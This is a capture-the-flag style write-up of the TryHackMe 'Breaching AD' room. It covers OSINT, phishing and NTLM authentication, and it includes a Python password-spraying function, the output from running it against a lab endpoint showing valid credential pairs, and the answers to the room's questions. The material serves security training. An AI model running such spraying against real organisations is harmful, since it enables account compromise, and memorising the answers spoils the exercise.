## Network Diagram :

![image](https://github.com/user-attachments/assets/a35a439d-bea6-4b15-8a03-6b06485eaa9e)

## Task 1 : Introduction to AD Breaches

- Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, we need initial access first. You need to acquire an initial set of valid **AD credentials**.
- Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant.

### Techniques to recover AD credentials in this room -

1. NTLM Authenticated Services
2. LDAP Bind Credentials
3. Authentication Relays
4. Microsoft Deployment Toolkit
5. Configuration Files

## Task 2 : OSINT and Phishing

### OSINT -

OSINT is used to discover information that has been publicly disclosed. In terms of AD credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as Stack Overflow but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as Github with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as HaveIBeenPwned and DeHashed provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

### Phishing -

- Phishing is another excellent method to breach AD.
- Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background.
- This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account.

> 1.  What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach? - `haveibeenpwned`

## Task 3 : NTLM Authenticated Services

- NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM.
- This authentication mechanism is heavily used by the services on a network.
-  However, services that use NetNTLM can also be exposed to the internet.

The following are some of the popular examples:

    1. Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
    2. Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
    3. Exposed VPN endpoints that were integrated with AD.
    4. Web applications that are internet-facing and make use of NetNTLM.

- NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user.
- This means that the application is authenticating on behalf of the user and not authenticating the user directly on the application itself. This prevents the application from storing AD credentials, which should only be stored on a Domain Controller. 

![image](https://github.com/user-attachments/assets/e3cfc683-bd38-4052-948a-ec8e1468c523)

### Brute-force Login Attacks -

Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. 


A service is runnning at https://ntlmauth.za.tryhackme.com prompts us for Windows Authentication credentials:

![image](https://github.com/user-attachments/assets/c5146601-2f29-43e9-a5d6-d1249f0dfbfc)

Using the following python script, we can perform password spraying attack

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

**Results**
```bash
┌──(kali㉿kali)-[~/THM/BreachingAD]
└─$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```
> 1. What is the name of the challenge-response authentication mechanism that uses NTLM? - `netNTLM`
> 
> 2. What is the username of the third valid credential pair found by the password spraying script? - `gordon.stevens`
> 
> 3. How many valid credentials pairs were found by the password spraying script? - `4`
> 
> 4. What is the message displayed by the web application when authenticating with a valid credential pair? - `Hello World`
